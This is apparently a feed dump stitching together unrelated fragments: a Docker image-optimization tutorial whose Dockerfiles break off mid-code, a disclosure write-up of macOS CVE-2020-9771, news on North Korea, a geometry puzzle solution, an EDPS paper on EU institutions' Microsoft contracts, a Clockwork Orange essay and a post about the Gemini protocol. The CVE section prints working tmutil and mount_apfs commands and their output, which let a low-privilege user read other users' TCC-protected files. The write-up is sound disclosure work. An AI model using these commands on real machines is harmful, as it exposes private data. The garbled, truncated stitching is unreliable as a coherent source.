<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p>Dockerizing an application is simple, effective, but optimizing the size of Docker Image is the tricky part. Docker is easy to use but once the application starts scaling, the image size inflates exponentially. In general, the node docker image size of the applications is over 1 GB most of the time.</p>
<h3>Why the Size matters</h3>
<ol>
<li>Large docker image sizes - Bigger image size requires more space means increased expense.</li>
<li>Long build durations - It takes a longer time to push the images over the network and results in CI Pipeline delays.</li>
</ol>
<h3>Let’s Start The Optimization</h3>
<p>Here is our <a href="https://github.com/championshuttler/fluentbit-dashboard">demo application</a> built using the VueJS Application. </p>
<p>Here is the initial Dockerfile.</p>
<div data-language="bash"><pre><code>FROM node:10

WORKDIR /app

COPY <span>.</span> /app

EXPOSE <span>8080</span>

RUN <span>npm</span> <span>install</span> http-server -g

RUN <span>npm</span> <span>install</span> <span>&amp;&amp;</span> <span>npm</span> run build

CMD http-server ./dist</code></pre></div>
<p>The size of this image is:</p>

  </a>
    </span></p>
<p>It is 1.34GB! Whoops!</p>
<p>Let’s start optimizing step by step</p>
<ol>
<li>Use <strong>Multi-Stage</strong> Docker Builds</li>
</ol>
<p>Multi-stage builds make it easy to optimize Docker images by using multiple <strong>intermediate</strong> images in a single Dockerfile. Read more about it <a href="https://docs.docker.com/develop/develop-images/multistage-build/">here</a>. By using multi-stage builds, we can install all dependencies in the build image and copy them to the leaner runtime image.</p>
<div data-language="bash"><pre><code>FROM node:10 AS BUILD_IMAGE

WORKDIR /app

COPY <span>.</span> /app

EXPOSE <span>8080</span>

COPY --from<span>=</span>BUILD_IMAGE /app/node_modules ./node_modules

RUN <span>npm</span> i -g http-server

<p>Now the size of this image is 1.24GB:</p>

<li>Remove Development Dependencies and use <strong>Node Prune</strong> Tool</li>
</ol>
<p>node-prune is an open-source tool for removing unnecessary files from the node_modules folder. Test files, markdown files, typing files and *.map files in Npm packages are not required at all in the production environment generally, most of the developers do not remove them from the production package. By using node-prune it can safely be removed.</p>
<p>We can use this to remove Development Dependencies:</p>

<p>After making these changes <code>Dockerfile</code> will look like:</p>
<div data-language="bash"><pre><code>FROM node:10 AS BUILD_IMAGE

RUN <span>curl</span> -sfL https://install.goreleaser.com/github.com/tj/node-prune.sh <span>|</span> <span>bash</span> -s -- -b /usr/local/bin

<![CDATA[CVE-2020-9771 – mount_apfs TCC bypass and privilege escalation]]>
            </title>
            <description>

July 4, 2020 | https://theevilbit.github.io/posts/cve_2020_9771/ | <a href="https://web.archive.org/web/*/https://theevilbit.github.io/posts/cve_2020_9771/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <h2 id="tldr">TL;DR</h2>
<p>We could mount the entire file system through APFS snapshots as read-only, with the <code>noowners</code> flag, which enables us accessing (almost) every file in the file system, including data (documents, files, etc…) of every user on the system, including those protected by Apple’s privacy framework (TCC). Even with the Guest account we could read files of admin accounts as Guest! 😱</p>
<p>This could be achieved with a single command, for example:
<code>mount_apfs -o noowners -s http://com.apple.TimeMachine.2019-11-17-141812.local /System/Volumes/Data /tmp/snap</code></p>
<p>This has been fixed in macOS Catalina 10.15.4 and on Mojave on the 26th of May.</p>
<h2 id="the-issues">The Issues</h2>
<p>There were two separate issues in this bug, and the combination of those became a very powerful system wide access.</p>
<ol>
<li>TCC privacy is not enforced on mounted local snapshots allowing someone to mount it and access any file inside, including those normally privacy protected</li>
<li>Initiating an APFS snapshot is available for all users, even low privileged ones, as well as listing of those. Beyond that, all users can mount local APFS snapshots, even a low privilege ones, and if used with the <code>noowners</code> flag, the low privilege user can access all data through the local snapshot, including every other users’ data (even high privileged one).</li>
</ol>
<h2 id="1-privacy-bypass">1. Privacy bypass</h2>
<p>From Terminal we can get a list of local snapshots available:</p>
<pre><code>% tmutil listlocalsnapshots /System/Volumes/Data
Snapshots for volume group containing disk /System/Volumes/Data:
com.apple.TimeMachine.2019-11-15-202744.local
com.apple.TimeMachine.2019-11-16-135116.local
com.apple.TimeMachine.2019-11-16-145028.local
com.apple.TimeMachine.2019-11-16-162241.local
com.apple.TimeMachine.2019-11-16-182353.local
com.apple.TimeMachine.2019-11-16-214156.local
com.apple.TimeMachine.2019-11-17-112126.local
com.apple.TimeMachine.2019-11-17-122313.local
</code></pre><p>We can mount one:</p>
<pre><code>csaby@mac ~ % /sbin/mount_apfs -o nobrowse,ro -s com.apple.TimeMachine.2019-11-16-182353.local /System/Volumes/Data /tmp/snap
</code></pre><p>If we navigate the user’s folder, we will be able access locations which our protected by TCC.</p>
<pre><code>csaby@mac ~ % ls -l /tmp/snap/Users/csaby/Library/Messages 
total 6224

-rw-r———r———   1 csaby  staff  1520312 Nov 16 08:09 prewarm.db-wal
</code></pre><p>if we compare it with standard access, it is not permitted:</p>
<pre><code>csaby@mac ~ % ls -l /Users/csaby/Library/Messages
ls: Messages: Operation not permitted
</code></pre><p>This is an issue as we can access every file through the local snapshot mountpoint.</p>
<p>We can also force the creation of a snapshot if there is no one:</p>
<pre><code>csaby@mac ~ % tmutil localsnapshot
Created local snapshot with date: 2019-11-17-140728
</code></pre><p>In short with <code>mount_apfs</code> we can completely bypass privacy protected folders.</p>
<h2 id="2--privilege-escalation">2.  “Privilege escalation”</h2>
<p>Although this method is not a full privilege escalation, as we don’t get higher privileges, however we can access files that belong to higher privilege users, and with the previous finding, this will include TCC protected data.</p>
<p>First, as a low privilege user we can create a local snapshot, and later list it to get its ID (this is not a bug). Although the second is not a hard requirement, as its ID can be figured out based on the time. Also snapshots are auto created by the system, so even if we can’t create one we can find one, and its ID is guessable, because it uses the following format: <code>yyyy-mm-dd-hhmmss</code>.</p>
<p>Here follows the demonstration of the issue. This is the low privileged ID I used:</p>
<pre><code>% id                       
uid=502(n00b) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),100(_lpoperator),702(com.apple.sharepoint.group.2),701(com.apple.sharepoint.group.1)
</code></pre><p>To show that it doesn’t have access to other user’s folder (where by-the-way, <code>csaby</code> is an admin user):</p>
<pre><code>n00b@mac Messages % ls -l /Users/csaby/Library 
ls: Library: Permission denied
</code></pre><p>Let’s create and list local snapshots:</p>
<pre><code>n00b@mac Messages % tmutil localsnapshot
Created local snapshot with date: 2019-11-17-141812

% tmutil listlocalsnapshots /
Snapshots for volume group containing disk /:
com.apple.TimeMachine.2019-11-17-133110.local
com.apple.TimeMachine.2019-11-17-133316.local
com.apple.TimeMachine.2019-11-17-141812.local
</code></pre><p>We can mount the snapshot with <code>noowners</code>, which according to the <code>manpage</code> means:</p>
<blockquote>
<p>Ignore the ownership field for the entire volume.  This causes all objects to appear as owned by user ID 99 and group ID 99.  User ID 99 is interpreted as the current effective user ID, while group ID 99 is used directly and translates to `unknown’.</p>
</blockquote>
<pre><code>n00b@mac Messages % mount_apfs -o noowners -s com.apple.TimeMachine.2019-11-17-141812.local /System/Volumes/Data /tmp/snap
mount_apfs: snapshot implicitly mounted readonly
</code></pre><p>And finally we can access all data from there as the privileges set for our user:</p>
<pre><code>% cd /tmp/snap/Users/csaby 
n00b@mac csaby % ls -l Library/Messages 
total 4704
-rw-r--r--  1 n00b  staff   258048 Nov  9 14:41 chat.db
-rw-r--r--  1 n00b  staff    32768 Nov 17 13:29 chat.db-shm
-rw-r--r--  1 n00b  staff  1507952 Nov  9 14:41 chat.db-wal
</code></pre><p>We can perform this attack even as a <code>Guest</code> account if FileVault is not turned ON. If FileVault is ON, Guest can only run Safari (after a reboot), and also the user data will be encrypted, so even if someone can break out the kiosk mode and start <code>Terminal</code> and run the above commands, he/she wouldn’t see the contents.</p>
<h2 id="the-fix-">The “Fix” 😭</h2>
<p>This requires some longer explanation as IMO the fix provided by Apple is not right.</p>
<p>At the beginning of March 2020, Apple said that the fix is shipped in Catalina 10.15.4 beta, they didn’t tell a word how they fixed it. I quickly jumped on it, and I found that the trick still works. I was puzzled. After some testing it turned out that they tied this to the Full Disk Access (FDA) right in TCC (<code>kTCCServiceSystemPolicyAllfiles</code>), which I found wrong. This is what I wrote them on the 13th of March:</p>
<blockquote>
<p>I did one more test and turned off “Full Disk Access” for Terminal, and then it indeed stopped working. I don’t consider this as a fix, relaying on TCC stopping this is a bad move in my opinion, most people will have Terminal set to “Full Disk Access”.</p>
<p>This still violates the basic BSD security model, as you can read other user’s file, without elevating to root. <strong>Even if SIP is OFF and Terminal has “Full Disk Access”, you shouldn’t be able to mount anything with “noowners” unless you are root</strong>. **The mount operation itself should fail.**If you think about it: Even if SIP is ON and Terminal has Full Disk Access, you can’t see other user’s files with it - with this vulnerability you can.</p>
<p>“Full Disk Access” TCC setting is global, which means that if an admin user enables this, a low privileged user can use Terminal to access the admin user’s files.</p>
</blockquote>
<p>I got a reply the same day:</p>
<blockquote>
<p>Thank you for providing additional information. We will investigate.</p>
</blockquote>
<p>After this point we went into, what I call “black hole mode”, I never got replies to my emails, and than <code>CVE-2020-9771</code> became public on the 26th of May. They shipped the fix to Mojave on that day (<a href="https://support.apple.com/en-us/HT211170),">https://support.apple.com/en-us/HT211170),</a> and retroactively updated the 10.15.4 security notes the same day with this CVE (<a href="https://support.apple.com/en-us/HT211100">https://support.apple.com/en-us/HT211100</a>). I tested this again, and I found the same behavior. At this point I still didn’t know if they considered this fixed or not, as no one came back to me. Their description “This issue was addressed with a new entitlement.” is extremely misleading.</p>
<p>I sent an email again on May 27th (still in “black hole mode”):</p>
<blockquote>
<p>I want to ask again if you consider this fixed via controlling this “exploit” via the “Full Disk Access” permission in TCC. As noted earlier I think it’s not right.</p>
</blockquote>
<p>Finally on the 29th of June I got a reply:</p>
<blockquote>
<p>This issue was addressed with macOS Catalina 10.15.5 and assigned CVE-2020-9771 -&gt;  <a href="https://support.apple.com/HT211170">https://support.apple.com/HT211170</a> . We are not planning any additional changes in this area.</p>
<p>macOS Catalina has improvements which have reduced the need for applications run through Terminal to require Full-Disk Access, and it should not be enabled by a user unless necessary.</p>
</blockquote>
<p>That’s it, not much I can do about this anymore, I only hope that it will get enough public attention, with many disappointed users about the fix, that 🍎 will reconsider the fix.</p>
<h2 id="conclusion">Conclusion</h2>
<p>The “Full Disk Access” right starts to get too much power these days, beyond controlling file access now it controls mounting, and also EndpointSecurity extensions.</p>
<p>This means that a user must be extremely careful which app is granted FDA right, because that will be able to access every user file on the system. If we grant for example <code>Terminal</code> this right, a low privilege user will be able to read our files through the app.</p>
<p>So until this is changed, please triple check what gets this right and what not.</p>

<p>Vice Foreign Minister Choe Son Hui claimed negotiations between Washington and Pyongyang will not work, as well as there will be no change in North Korea’s policy.</p>
<p>“We do not feel any type of need to negotiate with the U.S., as it does rule out the DPRK-U.S. discussion as nothing more than a tool for grappling its political situation,” Choe said in a declaration brought by state-run KCNA news agency.</p>
<p>DPRK represents the Democratic People’s Republic of Korea, North Korea’s formal name.</p>
<p>U.S. Deputy Secretary of State Stephen Biegun is due to see South Korea following week to talk about stalled talks with North Korea.</p>
<p>South Korean Head of state Moon Jae-in stated on Wednesday that U.S. President Donald Trump and also North Korean leader Kim Jong Un ought to meet again prior to the UNITED STATE elections in November, which would certainly aid resume the stalled nuclear talks.</p>
<p>Trump’s former national security adviser, John Bolton, told press reporters in New York on Thursday that the head of state may look for one more summit with Kim as an “October Surprise” ahead of the election.</p>
<p>Trump as well as Kim Jong Un met for the first time in 2018 in Singapore.<br>
They met again in Vietnam in 2019, yet the talks fell apart when Trump said Kim had actually failed to offer sufficient nuclear weapons or ballistic missiles in exchange for lifting international sanctions.</p>
<p>At their third meeting, in June 2019 at the demilitarized zone separating both Koreas, the two accepted to restart negotiations. Working-level talks in between both sides in Sweden in October were broken short.</p>

<h3 id="circle-time">Circle Time</h3>

<p>Every month, Jane Street Capital post a puzzle on their website.  This was the puzzle for <a href="https://www.janestreet.com/puzzles/circle-time/">June 2020</a>.</p>

<blockquote>
  <p>Call a “ring” of circles a collection of six circles of equal radius, say r, whose centers lie on the six vertices of a regular hexagon with side length 2r. This makes each circle tangent to its two neighbors, and we can call the center of the regular hexagon the “center” of the ring of circles. If we are given a circle C, what is the maximum proportion of the area of that circle we can cover with rings of circles entirely contained within C that all are mutually disjoint and share the same center?</p>
</blockquote>

<h3 id="solution">Solution</h3>

<p>I think the most difficult step in this months puzzle was to translate the problem statement above into a visual representation, as shown below.  If you got this far, you probably were able to solve the puzzle.</p>

<p><img width="600" src="https://willemhoek.com/images/janestreet-202006_1a.png"></p>

<p>Due to the symmetry of a hexagon, the ratio of the radius of two adjacent ring of circles are always the same.  Basic trigonometry was required to determine this ratio.</p>

<p><img src="https://willemhoek.com/images/janestreet-202006_trig.png"></p>

<p>We now have a single equation, single variable.</p>

<h3 id="method-1-to-solve-the-equation-goal-seek-in-excel">Method 1 to solve the equation: Goal Seek in Excel</h3>

<p>I used the “Goal Seek” function in Excel to resolve <em>k</em>.</p>

<p>In Excel: select the <strong>Data</strong> tab, in the <strong>Data Tools</strong> group, click <strong>What-If Analysis</strong>, and then click <strong>Goal Seek</strong>.</p>

<h3 id="method-2-to-solve-the-equation-online-solver-eg-wolframalpha">Method 2 to solve the equation: Online solver, e.g. WolframAlpha</h3>

<p>Another way to solve the equation is to use one of the online solvers, e.g. <a href="https://www.wolframalpha.com/input/?i=asin%28k%2F%281%2Bk%29%29+%2B+acos%281%2F%281%2Bk%29%29+%3D+pi%2F3">WolframAlpha</a></p>

<h2>EDPS Public Paper on</h2>

<p>2 July 2020</p>
<div>
<p>The European Data Protection Supervisor (EDPS) is the independent supervisory authority established by Article 52 of <a href="https://eur-lex.europa.eu/legal-content/EN/TXT/PDF/?uri=CELEX:32018R1725&amp;from=EN">Regulation (EU) 2018/1725</a> responsible for:</p>
<ul>
<li><p>Monitoring and ensuring the application of the provisions of Regulation (EU) 2018/1725 and any other EU act relating to the protection of the fundamental rights and freedoms of natural persons with regard to the processing of personal data by a EU institution or body;</p></li>
<li><p>Advising EU institutions and bodies and data subjects on all matters concerning the processing of personal data.</p></li>
</ul>
<p>To this end, the EDPS fulfils its duties in accordance with Article 57 of Regulation (EU) 2018/1725 and exercises the powers granted in Article 58 of Regulation (EU) 2018/1725.</p>
<p>The power to investigate is one of the tools established to monitor and ensure compliance with Regulation (EU) 2018/1725.</p>
</div>
<div>
<p>This paper presents the issues raised by the EDPS’ own-initiative investigation into European institutions’, bodies’, offices’ and agencies’ (‘EU institutions’) use of Microsoft products and services. These findings and recommendations from the investigation are likely to be of wider interest than just of the EU institutions: they may be of particular interest to all public authorities in EU/EEA Member States.</p>
<p>The EDPS assessed the compliance of the licensing agreement between Microsoft and the EU institutions against the requirements laid down in Regulation (EU) 2018/1725<span data-cites="regulation20181725"><a href="#fn1" id="fnref1" role="doc-noteref"><sup>1</sup></a></span> which sets out the rules for data protection in the EU institutions, bodies, offices and agencies as well as the duties and powers of the European Data Protection Supervisor (EDPS).</p>
<p>In the interest of a coherent approach to personal data protection throughout the Union, and the free movement of personal data within the Union, the legislators aligned Regulation (EU) 2018/1725 as far as possible with the data protection rules of Regulation (EU) 2016/679<span data-cites="gdpr"><a href="#fn2" id="fnref2" role="doc-noteref"><sup>2</sup></a></span> (‘General Data Protection Regulation’ - GDPR). Whenever the provisions of Regulation (EU 2018/1725 follow the same principles as the provisions of the GDPR, these two sets of provisions should, under the case law of the Court of Justice of the European Union be interpreted homogeneously, in particular because the scheme of this Regulation should be understood as equivalent to the scheme of the GDPR.</p>
<p>The EDPS made the following key findings in its investigation into the EU institutions’ use of Microsoft products and services.</p>
<p>First, the licensing agreement between Microsoft and the EU institutions allowed Microsoft to define and change the parameters of its processing activities carried out on behalf of EU institutions and contractual data protection obligations. The discretion that Microsoft had, amounted to a broad right for Microsoft to act as a controller. Given the EU institutions’ role as public service institutions, the EDPS did not consider this appropriate. The EDPS recommended to EU institutions that they act to retain controllership.</p>
<p>Second, EU institutions needed to put in place a comprehensive and compliant controller-processor agreement and documented instructions of the EU institutions to the processors. Their lack of control over which sub-processors Microsoft used and lack of meaningful audit rights also presented significant issues. The EDPS made recommendations on how to improve the controller-processor agreement and put robust audit checks in place.</p>
<p>Third, EU institutions faced a number of linked issues concerning data location, international transfers and the risk of unlawful disclosure of data. They were unable to control the location of a large portion of the data processed by Microsoft. Nor did they properly control what was transferred out of the EU/EEA and how. There was also a lack of proper safeguards to protect data that left the EU/EEA. EU institutions also had few guarantees at their disposal to defend their privileges and immunities and ensure that Microsoft would only disclose personal data insofar as permitted by EU law. The EDPS made recommendations to assist EU institutions in addressing these issues.</p>
<p>Fourth, the EDPS considered the technical measures that the Commission had put in place to stem the flow of personal data generated by Microsoft products and services and sent to Microsoft. The EDPS recommended that all EU institutions perform tests using a revised and comprehensive approach, share among them the knowledge and technical solutions they developed to prevent unauthorised data flows to Microsoft and inform each other of any data protection issues they identify with the products or services.</p>
<p>Fifth, the EU institutions had insufficient clarity as to the nature, scope and purposes of the processing and the risks to data subjects to be able to meet their transparency obligations towards data subjects. The EDPS recommended that EU institutions seek the clarity and assurances allowing them to keep data subjects properly informed.</p>

<h2 data-number="1.1" id="context"> Context</h2>
<p>This paper presents the issues raised by the EDPS’ own-initiative investigation into European institutions’, bodies’, offices’ and agencies’ (‘EU institutions’) use of Microsoft products and services. It presents the EDPS’ findings and recommendations from the investigation to be shared with a wider audience, applying a high standard of transparency<a href="#fn3" id="fnref3" role="doc-noteref"><sup>3</sup></a>, while preserving the necessary confidentiality of certain elements of the EU institutions’ contract and of the EDPS’ investigation.</p>
<p>A large amount of personal data is processed through the EU institutions’ use of Microsoft products and services. Over 45&nbsp;000 staff of EU institutions, including the EDPS, are users of those products and services. In addition, staff use Microsoft products and services to process the personal data of people who are not staff.</p>
<p>The EDPS’ investigation focused on the terms of the <em>Inter-Institutional Licensing Agreement</em> (‘ILA’) that EU institutions signed with Microsoft in 2018. The EDPS also considered the technical measures that the European Commission, as the largest EU institution with a great variety of tasks, had implemented affecting the flow of personal data to Microsoft.</p>
<p>The EDPS issued its findings and recommendations to the EU institutions upon the closure of its investigation in March 2020. The purpose of the EDPS’ report was to provide EU institutions with forward-looking assistance in bringing their arrangements into compliance with data protection law. In particular, the EDPS’ findings and recommendations were oriented towards supporting the renegotiation of the ILA and EU institutions’ contract and implementation of robust technical and organisational measures that should accompany the contract.</p>
<p>EU institutions’ processing of personal data and the EDPS’ own supervisory and investigative powers are governed by Regulation (EU) 2018/1725.<span data-cites="regulation20181725"><a href="#fn4" id="fnref4" role="doc-noteref"><sup>4</sup></a></span> The EDPS assessed the compliance of the ILA against the requirements laid down in that regulation. Although Regulation (EU) 2018/1725 is a data protection regime that is tailored to the EU institutions and distinct from the better-known General Data Protection Regulation<span data-cites="gdpr"><a href="#fn5" id="fnref5" role="doc-noteref"><sup>5</sup></a></span> (‘GDPR’), the overlap between the provisions of Regulation (EU) 2018/1725 and those of the GDPR is extensive.</p>
<p>As a consequence, the EDPS’ findings and recommendations are likely to be of wider interest than to EU institutions.<a href="#fn6" id="fnref6" role="doc-noteref"><sup>6</sup></a> Not only is the law the EDPS applied in its investigation based on the same principles and shares the vast majority of provisions with the GDPR, but the agreement signed by EU institutions is based on standard Microsoft volume-licensing documents and therefore likely to bear similarities to agreements concluded by other organisations. The EDPS’ findings and recommendations may be of particular interest to public authorities in EU member states.</p>
<p>They are also likely to be of relevance beyond the conclusion and implementation of volume licensing agreements for Microsoft products and services. In the EDPS’ view, organisations outsourcing provision or operation of digital services from other service providers are likely to come across similar issues.</p>
<h2 data-number="1.2" id="general-recommendations"> General recommendations</h2>
<p>The EDPS recommended that EU institutions carefully consider any purchases of Microsoft products and services or new uses of existing products and services until after they have analysed and implemented the recommendations of the EDPS. They should involve their Data Protection Officers when deciding how to implement the recommendations of the EDPS. The EU institutions should properly embed data protection in each specific public information and communications technology procurement procedure, specifying the security and data protection measures to be implemented in respect of the particular products and services that are being procured.</p>
<p>This will help EU institutions, from the start, to procure products and services with appropriate contractual and other organisational measures, technical and security measures so that the processing of personal data through those tools complies with Regulation (EU) 2018/1725, in particular with the principle of data protection by design and by default.<span data-cites="regulation20181725"><a href="#fn7" id="fnref7" role="doc-noteref"><sup>7</sup></a></span></p>

            <p><em>This week's Viewer film essay: on Stanley Kubrick’s A Classic Orange. What kinds of writing would you like to see from the Viewer? All suggestions much appreciated. Let us know at <a href="mailto:editors@theviewer.is">editors@theviewer.is</a></em></p><hr><p><em>Spoilers Ahead (and for Taxi Driver, Parasite, and Barry Lyndon), and ultraviolence throughout.</em></p><p>Here is a typical character arc: the main character has a problem. They are living life in a self-perpetuating stasis, in need of change. An inciting event comes along to break that stasis, and they are forced to undergo a journey that spits them out as a better person.</p><p>This is a truncated version of Joseph Campbell’s cherished Monomyth, and most stories follow it in some way or other. I’ll call it the Change arc. Stanley Kubrick’s “A Clockwork Orange” follows a much less common pattern: the Repetition arc.</p><figure><img src="https://lh3.googleusercontent.com/HQv_8xSVpcFKDrzqDNxJgvsS8JPqIMbZnzabr8913uvu-NymSz4E-cPRN7WhQQXgmkiWHTf8WK9hP_scbHdyj9kuqw80Okk5XQnHyXF-1s_GDgZ3lpug_UyYSTvShHi2kJ3419hVaTGlRV2iLQ" alt=""></figure><p>The first two stages of the Repetition arc are identical to the Change arc. The hero of “A Clockwork Orange,” Alex DeLarge, is a young hooligan who wanders a futuristic Britain with his street gang the “droogs”, raping, assaulting and defacing everyone and everything that comes in their path. Here we certainly are presented with a problematic, self-perpetuating stasis. One night, during a break-in, Alex is arrested – our inciting event. Over the next few years in prison, he is institutionalized and put through an experimental indoctrination program known as the Ludovico technique, all in a bid to rehabilitate him. This portion of the film serves as his journey, his struggle to become better.</p><p>The treatment initially seems to work – it conditions Alex’s mind to react negatively to sex and violence. He is released back onto the streets. And yet the film doesn’t end with Alex having changed or become a better person – in the last scene, he finds he has lost his aversion to sex and violence and begins once again to experience vulgar sexual fantasies. “I was cured, all right!” he quips. He has returned to his first act stasis; after all his narrative trials and tribulations, nothing has really changed.</p><p>The Repetition arc has been used in many great films. “Taxi Driver” is the story of a disturbed loner who struggles to become better, ending up showered in public praise but just as disturbed as he always was. Bong Joon Ho’s recent critical darling “Parasite” is about a family that strives to be rich and never succeeds; a socio-economic twist on the Repetition arc. Kubrick himself would return to it with the underrated “Barry Lyndon,” the tale of an Irish rogue who tries to deceive his way into a fortune, but ends up alone, crippled and destitute, all of his ambitions having disintegrated.</p><p>The Repetition arc is essentially a pessimistic one. It tells the audience that things never change, that people live in hopeless cycles predetermined by their own characters and that their struggles to achieve moral betterment or success will inevitably collapse in on themselves. One might think that the Repetition arc would be narratively unsatisfying, because it fails to transport the audience. They don’t learn anything from the story. This isn’t the only kind of storytelling technique, though. If done right, symmetry and repetition can be just as narratively cathartic as growth. There is a powerful unity to a story that is bookended by identical scenes and sentiments, a sense of overarching stasis that is almost comforting in its nihilism.</p><p>We know that the Repetition arc is important to Stanley Kubrick’s film, because in the book upon which it is based, Alex <em>does </em>change. Anthony Burgess’ 1962 novel ends with Alex growing discontent with the criminal life and becoming a productive and happy member of society. Surprisingly, his original story is the Change arc incarnate. American publishers insisted on cutting the final chapter so the novel would end on a darker note, lopping off the Change and replacing it with Repetition. Burgess reluctantly agreed, although he called the American version “badly flawed.” When he was adapting the book for the screen, Kubrick opted for the American ending, going so far as to say that he never even considered including that final, redemptive chapter.</p><p>What does the Repetition arc signify in the story of “A Clockwork Orange”?</p><p>Well, both the Repetition and the Change arc start with a problem that the protagonist faces. Alex’s problem is that he is a bad person. He’s bad not because he is misguided, or depressed, or self-centered, or angry, or pretentious, or lazy – he’s simply <em>evil. </em>Burgess, Kubrick and McDowell crafted an amoral man, a man whose entire life is built around delighting in the pain of others. Early in the film, Alex and his droogs pass a homeless man who begs them for money. Cackling, they mercilessly beat him unconscious with their batons.</p><figure><img src="https://lh6.googleusercontent.com/XF63e4X5Q8XUOJm-0coaJNAcaptigvBj82O-Nw055wASuE10JyQgjITik5mxSXmh2SwyrGvfY6dYcaRePH4MweAS1tbw5FRlZxaiuYOUKNH910krDdci7hYShTRQJw9tjVzxrfa7rCDf58MrVA" alt=""></figure><p>The first act of the movie is almost entirely devoted to showing how bad Alex is. One might assume that Kubrick is trying, with these horrific scenes, to distance the audience from Alex, to cut off any possible empathy we might feel for him – but Kubrick said, “Alex symbolizes man in his natural state, the way he would be if society did not impose its ‘civilizing’ processes upon him. What we respond to subconsciously is Alex’s guiltless sense of freedom to kill and rape, and to be our savage natural selves, and it is in this glimpse of the true nature of man that the power of the story derives.” Kubrick wants us to experience Alex’s actions as evil, yes, but also as <em>free</em> – there is a kind of wild, barbaric joy in his ability to act badly and remain unpunished.</p><p>This freedom makes Alex’s eventual arrest and his tortuous imprisonment feel unbearably oppressive. The brand of re-education that he is subjected to is inherently futile – from the government’s perspective, it is a process of rehabilitating and morally improving a delinquent member of society. From our perspective, it is the equivalent of chaining a grizzly bear to a seat and trying to teach it advanced calculus. Although the “Ludovico technique” may subdue and sterilize Alex’s savage character, it can never make him good. Socrates emphasized in several Platonic dialogues that you cannot force someone else to have knowledge. Virtue is an intentional, personal state of the soul. The government has two choices; restrict Alex’s freedom, in which case he is little more than a robot, or let him exercise it, in which case he will leave a trail of destruction and cruelty in his wake.</p><p>The “journey” towards goodness that Alex experiences is a regression, rather than a progression. Thus, the second act of the Repetition arc is not the same as the second act of a Change arc – this journey is pointless from its inception. The Repetition arc mitigates the shock of its seemingly unresolved ending because the journey that fails to succeed was doomed from the very start. It is also important that Alex’s journey is not voluntary – it is quite literally forced upon him (a fact which is shockingly visualized in the infamous Ludovico scene). In this way, “A Clockwork Orange” is a variation on the traditional Repetition arc, replacing a failed personal struggle with a failed attempt at outward rehabilitation. It says that our personal efforts at development may be doomed, but prisons and indoctrination programs are no better.</p><figure><img src="https://lh6.googleusercontent.com/fpcF7mRsmJU56-vjE-73YSXZZSF_1fPFzNPZIp6dtD8ffp7Vkh397PZ7VlRkv2D_XlY6wVxkbJpVPkXOk2v9zfRLLtTG5ERWkkVH6vocGBqz3mXBzfDSMRCFUnIhrkRR0fL4iBVjA48rtt5Kig" alt=""></figure><p>Perhaps, then, the point of the Repetition arc in “A Clockwork Orange” is as simple as this; a bad man cannot be made good. Alex has a problem, a problem that is unacceptable in its natural state – for the writer whom Alex and his droogs cripple, or the writer's wife, whom they gang-rape, or the cat-lady Alex bludgeons in her own home – yet the Ludovico technique is just as hopeless. Alex’s rotten soul sits festering at the ideological center of the film, like a tumor for which scientists have no cure. Kubrick eschews Burgess’s more positive outlook, sending a message about human nature so cynical that the Repetition arc is the only acceptable mode of expression.</p><p>Back to that enigmatic ending. Alex sits in a hospital bed. The adoring press crowd around, snapping photos of him. The media is choosing to portray him as a victim of terrible state oppression – as we explore his sick imagination in those final moments, we recognize that this “victim” is not so innocent and never has been. The one thing that could have changed Alex would be a genuine attempt on his part to improve his soul, but from that opening shot of Alex staring malignantly into the camera, we know that he doesn’t have that in him. From the crooked timber of humanity, nothing can be made straight.</p><figure><img src="https://lh3.googleusercontent.com/vDLw5d872mwsvOypY0WP8HhIPAAR23gJf-Z7EmattuFHNJigIjaM-bVZPsJKdMFGsuZPaaA7vwb2rdgBEM5308qZe4J9P8vwdOwKLUcrW7yQW9tgsary_p2FuX2VvWZ7yo60N7G_RMikubyiLQ" alt=""></figure>

<article>

<p>Published on <b>2020-06-18</b></p>
<p>I have really come to hate the World Wide Web. It is bloated at every level! Websites themselves are doubling in size at an alarming rate. The web standards are expanding at an alarming rate. Trying to build a web browser that works with the modern web from scratch, would take the manpower equivalent to the Snowy Mountains Scheme or the Manhattan Project (no hyperbole).</p>
<p>The state of the web has lead me to only one conclusion: It is broken beyond repair.</p>
<p>I don't think the web can replaced, but we can still look for simpler (open standards) alternatives to move our works to. Gemini is one of these alternatives that I have taken interest in recently. A fairly recent protocol, created in 2019, Gemini defines a markdown-inspired document format, and it's own protocol to serve these documents, or other files.</p>
<p>If you a looking for a 1:1 clone for the early web, you will probably be disappointed. Gemini takes way more design hints from <a href="https://en.wikipedia.org/wiki/Gopher_(protocol)">Gopher</a> then it ever will from the web. Gopher (widely considered a predecessor to the web) is built on the idea of text only documents. Gemini expands on this idea by offering basic formatting, and fixing drawbacks unaccounted for in the original Gopher protocol.</p>
<p>Gemini shys away from many standard features of the web. Although there may be plenty of benefits that one accustomed to web wouldn't be able to identify. For example the lack of styling sheets may mean that Gemini sites look plain, however this allows your readers to decide on a colour scheme which suits them best. A night reader would prefer a dark theme, someone with a vision impairment will prefer high contrast, the list goes on.</p>
<p>Gemini offers no in-line image support no client-side scripting (such as Javascript). But server-side scripting (CGI) can work, so you could expect Gemini to be a valid interface for some online services.</p>
<p>The Gemini transport protocol is unsuitable for the transfer of large files, since it misses many features that protocols such as FTP or HTTP use to recover from network instability.</p>
<p>The internet protocols of old aren't encrypted by default, since security wasn't seen as being important back in the late-80's/early-90's. Thankfully Gemini, being a recent protocol, mandates the use of TLS. There is no unencrypted version of Gemini available.</p>
<p>I could totally see Gemini being used as an alternative particularly for the non-commercial individuals who use text as a primary medium. Blogs, poems, recipes, tutorials are perfect for the Gemini format. There are always ways around the lack of media functionality, since although Gemini lacks in-line images, you can still use in-line links to images. As time goes on I could imagine some Gemini browsers providing a fancy image viewer for links to images.</p>
<p>Now, what does Gemini currently have to offer? The best way to find out is to head over to the official site: <code>gemini.circumlunar.space</code> in your Gemini browser. Here you can find two search engines dedicated to finding pages based on what you search for. And two aggregators which acts as a news feed of Gemini posts.</p>
<p>Personally I enjoy scrolling through the aggregators and seeing what people are blogging about, I find interesting stuff frequently.</p>
<p>From a server management perspective, Gemini is just a diet-Web. You buy a domain name (using the web), obtain or rent a server, install a Gemini server, and start serving your site. In order to post to Gemini you either need to self-host, or take advantage of Gemini hosting which is currently on offer by circumlunar.space. No fancy P2P or Blockchain solution here, just a good old client/server model.</p>
